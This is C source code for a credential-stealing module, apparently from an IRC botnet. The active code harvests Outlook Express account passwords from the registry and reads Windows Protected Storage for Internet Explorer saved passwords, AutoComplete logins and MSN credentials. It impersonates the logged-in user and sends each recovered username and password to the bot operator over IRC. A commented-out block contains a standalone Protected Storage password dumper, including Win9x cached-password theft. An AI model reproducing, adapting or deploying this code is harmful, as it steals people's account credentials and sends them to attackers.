#include "includes.h"
#include "functions.h"
#ifndef NO_PSTORE
extern char str_nopstore[];
extern char str_noadvapi[];

DWORD WINAPI PStore(LPVOID param)
{
	NTHREAD pstore = *((NTHREAD*)param);
	NTHREAD *pstores = (NTHREAD *)param;
	pstores->gotinfo = TRUE;
	IRC* irc=(IRC*)pstore.conn;

	char filter[IRCLINE];
	
	if (pstore.data1)
		strncpy(filter,pstore.data1,sizeof(filter));

	if (!noadvapi32)
		EnumOutlookAccounts();
	else
		irc->privmsg(pstore.target,str_noadvapi,pstore_title);

	if (!nopstore)
	{
		if (pstore.data1)
			EnumPStorage(pstore.target,irc,filter,pstore.silent,pstore.verbose);
		else
			EnumPStorage(pstore.target,irc,NULL,pstore.silent,pstore.verbose);
	}
	else
		irc->privmsg(pstore.target,str_nopstore,pstore_title);
			
	clearthread(pstore.threadnum);
	ExitThread(0);
}

OOUTDATA OutlookData[50];
int oIndex=0;
void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;
	lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult1);
	if (ERROR_SUCCESS != lResult)
		return ;
	
	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while (l!=ERROR_NO_MORE_ITEMS) {
		dw2=200;
		l=fRegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
		lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey,"\\");
		lstrcat(skey,name);
		fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult);
		size=sizeof(Data);
		if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver,"Hotmail");
			size=sizeof(Data);
			if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if (IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data));
			oIndex++;
		}
		else if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			fRegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, Data, &size ) ;
			lstrcpy(OutlookData[oIndex].POPserver,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			if(fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}
}


BOOL EnumPStorage(char *target,void *conn,char *filter,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;

	if (!IsServiceRunning("ProtectedStorage"))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Protected Storage is not running.",pstore_title);
		return FALSE;
	}
#ifndef NO_SERVICE
	ImpersonateInteractiveUser();
#endif

	int iSent=0;
	IPStorePtr PStore; 
	HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s PStoreCreateInstance failed.",pstore_title);
		return FALSE;
	}

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Failed to query Protected Storage.",pstore_title);
		return FALSE;
	}

	GUID TypeGUID;
	char szItemName[512];
	char szItemData[512];
	char szResName[1512];
	char szResData[512];
	char szItemGUID[50];

	while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
	{
		wsprintf(szItemGUID,"%x",TypeGUID);

		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
		{
			IEnumPStoreItemsPtr spEnumItems;
			HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

			LPWSTR itemName;
			while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
			{
				wsprintf(szItemName,"%ws",itemName);			 
				char chekingdata[200];
				unsigned long psDataLen = 0;
				unsigned char *psData = NULL;
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
				if(lstrlen((char *)psData)<(psDataLen-1))
				{
					int i=0;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
							szItemData[i]=',';
						else
							szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;				  			
				}
				else
				{
					wsprintf(szItemData,"%s",psData);				  
				}	
				lstrcpy(szResName,"");
				lstrcpy(szResData,"");

				//5e7e8100 - IE:Password-Protected sites
				if (lstrcmp(szItemGUID,"5e7e8100")==0)
				{				  
					lstrcpy(chekingdata,"");
					if(strstr(szItemData,":")!=0)
					{
						lstrcpy(chekingdata,strstr(szItemData,":")+1);
						*(strstr(szItemData,":"))=0;				  
					}
					iSent++;
					if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
						irc->privmsg_filter(target,filter,"%s IE Password Protected: %s, %s:%s",pstore_title,szItemName,szItemData,chekingdata);
				}

				//e161255a - IE:AutoComplete
				if (lstrcmp(szItemGUID,"e161255a")==0)
				{
					if (strstr(szItemName,"StringIndex")==0)
					{
						if(strstr(szItemName,":String")!=0)
							*strstr(szItemName,":String")=0;
						
						lstrcpyn(chekingdata,szItemName,8);			  
//						if ((strstr(chekingdata,"http:/")==0)&&(strstr(chekingdata,"https:/")==0)&&verbose)
//						{
//							if (!strcmp(szItemName,"username"))
//								irc->privmsg_filter(target,filter,"IE Auto-Complete: Usernames: %s",szItemData);
//
//							else
//								irc->privmsg_filter(target,filter,"IE Auto-Complete: Unknown: %s, %s, %s",szItemName,szItemData,chekingdata);
//						}
//						else
						if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
						{
							lstrcpy(chekingdata,"");
							if(strstr(szItemData,",")!=0)
							{
								lstrcpy(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}
							iSent++;
							if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
								irc->privmsg_filter(target,filter,"%s IE Auto-Complete: %s, %s:%s",pstore_title,szItemName,szItemData,chekingdata);
						}
					}
				}
				//	  b9819c52 MSN Explorer Signup
				if (lstrcmp(szItemGUID,"b9819c52")==0)
				{
					char msnid[100];
					char msnpass[100];
					int i=0;
					BOOL first=TRUE;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
						{
							szItemData[i]=',';					
							i++;
						}
						else
						{
							if (IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
							{
								szItemData[i]=psData[m];					
								i++;
							}							
						}
					}
					szItemData[i-1]=0;
					char *p;
					p=szItemData+2;
					//psData[4] - number of msn accounts 
					for(int ii=0;ii<psData[4];ii++)
					{
						lstrcpy(msnid,p+1);
						if (strstr(msnid,",")!=0)
							*strstr(msnid,",")=0;
					
						if(strstr(p+1,",")!=0)
							lstrcpy(msnpass,strstr(p+1,",")+2);				

						if(strstr(msnpass,",")!=0)
							*strstr(msnpass,",")=0;

						p=strstr(p+1,",")+2+lstrlen(msnpass)+7;
						if ((strcmp(msnpass,"") && strcmp(msnid,"")) || verbose)
						{
							iSent++;
							irc->privmsg_filter(target,filter,"%s MSN: %s:%s",pstore_title,msnid,msnpass);
						}
					}
				}

				//220d5cc1 Outlooks
				if (lstrcmp(szItemGUID,"220d5cc1")==0)
				{
					BOOL bDeletedOEAccount=TRUE;		
					for (int i=0;i<oIndex;i++)
					{
						if((lstrcmp(OutlookData[i].POPpass,szItemName)==0)&&(strcmp(szItemData,"")))
						{
							bDeletedOEAccount=FALSE;
							iSent++;
							irc->privmsg_filter(target,filter,"%s Outlook Express: %s, %s:%s",pstore_title,OutlookData[i].POPserver,OutlookData[i].POPuser,szItemData);
							break;
						}
					}
					if (bDeletedOEAccount && ((strcmp(szItemData,"") && strcmp(OutlookData[i].POPuser,"")) || verbose))
					{
						iSent++;
						irc->privmsg_filter(target,filter,"%s Erased Outlook Express: %s:%s",pstore_title,OutlookData[i].POPuser,szItemData);
					}
				}

				ZeroMemory(szItemName,sizeof(szItemName));
				ZeroMemory(szItemData,sizeof(szItemData));			  
			}
		}
	}
	if (iSent==0)
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s No Protected Storage entries found.",pstore_title);
	}
	return TRUE;
}


/*
//Protected Storage Explorer
//By Hirosh

char SavingFname[MAX_PATH];
HWND hwndlistview;
BOOL iS9x=FALSE;
typedef struct TOOUTDATA{
	char POPuser[100];
	char POPpass[100];
	char POPserver[100];
} OOUTDATA;
OOUTDATA OutlookData[50];
int oIndex=0;

void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;
	lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult1);
	if (ERROR_SUCCESS != lResult)
		return ;

	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while (l!=ERROR_NO_MORE_ITEMS) {
		dw2=200;
		l=RegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
		lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey,"\\");
		lstrcat(skey,name);
		RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult);
		size=sizeof(Data);
		if (RegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver,"Hotmail");
			size=sizeof(Data);
			if (RegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				char mess[100];
				for(int i=2;i<size;i++)
					if (IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
				OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data));
			oIndex++;
		}
		else if (RegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			RegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, Data, &size ) ;
			lstrcpy(OutlookData[oIndex].POPserver,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			if(RegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				char mess[100];
				for(int i=2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
				OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}
}


void SaveToDisk(char *buf)
{
	DWORD dwBytes;
	HANDLE hf=CreateFile(SavingFname,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	SetFilePointer(hf,0,NULL,FILE_END);
	WriteFile(hf,(LPVOID)buf,strlen(buf),&dwBytes,NULL);
	CloseHandle(hf);
}

BOOL AddItemm(BOOL Save,char *resname,char *restype,char *usrname,char *pass)
{
	if (!Save)
	{
		LVITEM lvi;	
		lvi.mask = LVIF_TEXT; 
		lvi.state = LVIS_SELECTED ; 
		lvi.stateMask = 0; 
		
		lvi.iItem = 10000;
		lvi.iSubItem = 0;
		lvi.pszText = "";
		
		int i = ListView_InsertItem(hwndlistview, &lvi);
		if(!iS9x)
		{
			ListView_SetItemText(hwndlistview, i, 0, resname);
			ListView_SetItemText(hwndlistview, i, 1, restype);
			ListView_SetItemText(hwndlistview, i, 2, usrname);
			ListView_SetItemText(hwndlistview, i, 3, pass);
		}
		else
		{
			ListView_SetItemText(hwndlistview, i, 0, usrname);
			ListView_SetItemText(hwndlistview, i, 1, pass);
		}
		SetFocus(hwndlistview);
		ListView_SetItemState (hwndlistview,i,LVIS_FOCUSED | LVIS_SELECTED, 0x000F);     
		ListView_SetSelectionMark(hwndlistview,i);
	}
	else
	{		
		if(!iS9x)
		{
			SaveToDisk("\r\n");
			SaveToDisk("<tr><td>");
			SaveToDisk(resname);
			SaveToDisk("</td><td>");
			SaveToDisk(restype);
			SaveToDisk("</td><td>");
			SaveToDisk(usrname);
			SaveToDisk("</td><td>");
			SaveToDisk(pass);
			SaveToDisk("</td></tr>");	
			SaveToDisk("\r\n");
		}
		else
		{
			SaveToDisk("\r\n");
			SaveToDisk("<tr><td>");
			SaveToDisk(usrname);
			SaveToDisk("</td><td>");
			SaveToDisk(pass);
			SaveToDisk("</td></tr>");	
			SaveToDisk("\r\n");
		}		
	}
	return TRUE;
}   

void EnumPStorage(BOOL Save)
{
	typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
	HMODULE hpsDLL; 
	hpsDLL = LoadLibrary("pstorec.dll");

	tPStoreCreateInstance pPStoreCreateInstance;
	pPStoreCreateInstance = (tPStoreCreateInstance)GetProcAddress(hpsDLL, "PStoreCreateInstance");

	IPStorePtr PStore; 
	HRESULT hRes = pPStoreCreateInstance(&PStore, 0, 0, 0); 

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if (!FAILED(hRes))
	{

		GUID TypeGUID;
		char szItemName[512];
		char szItemData[512];
		char szResName[1512];
		char szResData[512];
		char szItemGUID[50];

		while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
		{      
			wsprintf(szItemGUID,"%x",TypeGUID);

			IEnumPStoreTypesPtr EnumSubTypes;
			hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

			GUID subTypeGUID;
			while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
			{
				IEnumPStoreItemsPtr spEnumItems;
				HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

				LPWSTR itemName;
				while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
				{
					wsprintf(szItemName,"%ws",itemName);			 
					char chekingdata[200];
					unsigned long psDataLen = 0;
					unsigned char *psData = NULL;
					_PST_PROMPTINFO *pstiinfo = NULL;
					hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
					if(lstrlen((char *)psData)<(psDataLen-1))
					{
						int i=0;
						for(int m=0;m<psDataLen;m+=2)
						{
							if(psData[m]==0)
								szItemData[i]=',';
							else
								szItemData[i]=psData[m];
							i++;
						}
						szItemData[i-1]=0;				  			
					}
					else
					{
						wsprintf(szItemData,"%s",psData);				  
					}	
					lstrcpy(szResName,"");
					lstrcpy(szResData,"");
					
					//220d5cc1 Outlooks
					if (lstrcmp(szItemGUID,"220d5cc1")==0)
					{
						BOOL bDeletedOEAccount=TRUE;		
						for (int i=0;i<oIndex;i++)
						{
							if(lstrcmp(OutlookData[i].POPpass,szItemName)==0)
							{
								bDeletedOEAccount=FALSE;
								AddItemm(Save,OutlookData[i].POPserver,"OutlookExpress",OutlookData[i].POPuser,szItemData);
								break;
							}
						}
						if (bDeletedOEAccount)
							AddItemm(Save,szItemName,"Deleted OE Account",OutlookData[i].POPuser,szItemData);
					}				 

					//5e7e8100 - IE:Password-Protected sites
					if (lstrcmp(szItemGUID,"5e7e8100")==0)
					{				  
						lstrcpy(chekingdata,"");
						if(strstr(szItemData,":")!=0)
						{
							lstrcpy(chekingdata,strstr(szItemData,":")+1);
							*(strstr(szItemData,":"))=0;				  
						}
						AddItemm(Save,szItemName,"IE:Password-Protected sites",szItemData,chekingdata);
					}
	
					//	  b9819c52 MSN Explorer Signup
					if (lstrcmp(szItemGUID,"b9819c52")==0)
					{
						char msnid[100];
						char msnpass[100];
						int i=0;
						BOOL first=TRUE;
						for(int m=0;m<psDataLen;m+=2)
						{
							if(psData[m]==0)
							{
								szItemData[i]=',';					
								i++;
							}
							else
							{
								if (IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
								{
									szItemData[i]=psData[m];					
									i++;
								}							
							}
						}
						szItemData[i-1]=0;
						char *p;
						p=szItemData+2;
						//psData[4] - number of msn accounts 
						for(int ii=0;ii<psData[4];ii++)
						{
							lstrcpy(msnid,p+1);
							if (strstr(msnid,",")!=0)
								*strstr(msnid,",")=0;
						
							if(strstr(p+1,",")!=0)
								lstrcpy(msnpass,strstr(p+1,",")+2);				

							if(strstr(msnpass,",")!=0)
								*strstr(msnpass,",")=0;

							p=strstr(p+1,",")+2+lstrlen(msnpass)+7;
							AddItemm(Save,msnid,"MSN Explorer Signup",msnid,msnpass);
						}
					}

					//e161255a IE 
					if (lstrcmp(szItemGUID,"e161255a")==0)
					{
						if (strstr(szItemName,"StringIndex")==0)
						{
							if(strstr(szItemName,":String")!=0)
								*strstr(szItemName,":String")=0;
							
							lstrcpyn(chekingdata,szItemName,8);			  
							if ((strstr(chekingdata,"http:/")==0)&&(strstr(chekingdata,"https:/")==0))
								AddItemm(Save,szItemName,"IE Auto Complete Fields",szItemData,"");
							else
							{
								lstrcpy(chekingdata,"");
								if(strstr(szItemData,",")!=0)
								{
									lstrcpy(chekingdata,strstr(szItemData,",")+1);
									*(strstr(szItemData,","))=0;				  
								}
								AddItemm(Save,szItemName,"AutoComplete Passwords",szItemData,chekingdata);
							}
						}
					}
					ZeroMemory(szItemName,sizeof(szItemName));
					ZeroMemory(szItemData,sizeof(szItemData));			  
				}
			}
		}
	}
}

//Cached Passwords - 9x
struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
};
typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;

typedef BOOL (FAR PASCAL *CACHECALLBACK)(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData);
typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);

DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);
ENUMPASSWORD pWNetEnumCachedPasswords;

BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource+1;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword+1;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
void CashedPass(BOOL Save)
{
   HMODULE hLib=LoadLibrary("MPR.DLL");

   PASSCACHECALLBACK_DATA dat;
   dat.pBuffer=(char *)malloc(65536);
   dat.nBufLen=65536;
   dat.nBufPos=0;
   pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");

   pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
   char *svStr;
   svStr=dat.pBuffer;   
   do {
	     char *svRsc=svStr;
		 svStr+=lstrlen(svStr)+1;		 
	   	 char *svPwd=svStr;
		 svStr+=lstrlen(svStr)+1;		 
		 char szUser[1024];
		 char szPass[1024];		 
		 AddItemm(Save,"","",svRsc,svPwd);				         		 
   }while(*svStr!='\0');

   FreeLibrary(hLib);

};
/////////////////////////////////////////
#define TableHeader "<p><b><font color=\"#FF0000\"></font></b></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\"style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100%\" id=\"AutoNumber1\">"
#define Table "</table>"
#include <commdlg.h>
LRESULT CALLBACK DLgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
OPENFILENAME ofn;
char szFile[MAX_PATH];  
	switch (message){

	case WM_INITDIALOG:
	SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(0), MAKEINTRESOURCE(IDI_ICON1)));		
	if(!iS9x)
		SetWindowText(hDlg,"Protected Storage                        www.hirosh.NET");
	else
		SetWindowText(hDlg,"Cashed Passwords                         www.hirosh.NET");

			hwndlistview = GetDlgItem(hDlg, IDC_LIST3);
			LVCOLUMN lvcol;
			if(!iS9x){
			lvcol.mask =LVCF_TEXT;;
			lvcol.pszText = "Resource Name";
			ListView_InsertColumn(hwndlistview, 0, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 0, 160);
			
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Resource Type";			
			ListView_InsertColumn(hwndlistview, 1, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 1, 110);		
			
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "User Name/Value";			
			ListView_InsertColumn(hwndlistview, 2, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 2, 200);		

			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Password";			
			ListView_InsertColumn(hwndlistview, 3, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 3, 100);
			EnumOutlookAccounts();
			EnumPStorage(FALSE);
			}
			else{
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "User Name/Value";			
			ListView_InsertColumn(hwndlistview, 0, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 0, 250);		

			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Password";			
			ListView_InsertColumn(hwndlistview, 1, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 1, 150);						
			CashedPass(FALSE);
			}
			ListView_SetExtendedListViewStyle(hwndlistview,LVS_EX_FULLROWSELECT);
	
		return TRUE;

case WM_COMMAND:
		switch ( LOWORD(wParam) ){

		case IDOK:		
			ZeroMemory(&ofn, sizeof(OPENFILENAME));
			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.hwndOwner = hDlg;lstrcpy(szFile,"*.*");
			ofn.lpstrFile ="pstectedstorage.htm";	ofn.nMaxFile = sizeof(szFile);
			ofn.lpstrFilter = "Htm\0*.htm\0";
			ofn.nFilterIndex = 1;ofn.lpstrFileTitle = NULL;
			ofn.nMaxFileTitle = 0;	ofn.lpstrInitialDir = NULL;
			ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
			if (GetSaveFileName(&ofn)==TRUE) {
			lstrcpy(SavingFname,ofn.lpstrFile);
			if(strstr(SavingFname,".htm")==0)lstrcat(SavingFname,".htm");			
			SaveToDisk(TableHeader);
			if(!iS9x){
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">Resource Name&nbsp;</font></b></td><td><b><font color=\"#FF0000\">Resource Type&nbsp;</font></b></td><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			EnumOutlookAccounts();
			EnumPStorage(TRUE);
			}
			else{
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			CashedPass(TRUE);						
			}
			SaveToDisk(Table);
			}
			break;
		case IDCANCEL:
			EndDialog(hDlg, LOWORD(wParam));
			ExitProcess(0);
			break;

		break;
		}
	}

    return FALSE;
}
//
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)

{	
	if((int)GetVersion() < 0) iS9x=TRUE;
	else iS9x=FALSE;
	if(lpCmdLine[0]==NULL){
	InitCommonControls();
	DialogBox(hInstance, (LPCTSTR)IDD_DIALGMAIN, 0, (DLGPROC)DLgProc);
	}
	else
	{
			lstrcpy(SavingFname,lpCmdLine);
			SaveToDisk(TableHeader);
			if(!iS9x){
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">Resource Name&nbsp;</font></b></td><td><b><font color=\"#FF0000\">Resource Type&nbsp;</font></b></td><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			EnumOutlookAccounts();
			EnumPStorage(TRUE);
			}
			else{
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			CashedPass(TRUE);			
			}
			SaveToDisk(Table);
			
	
	}

	return 0;
}
*/
#endif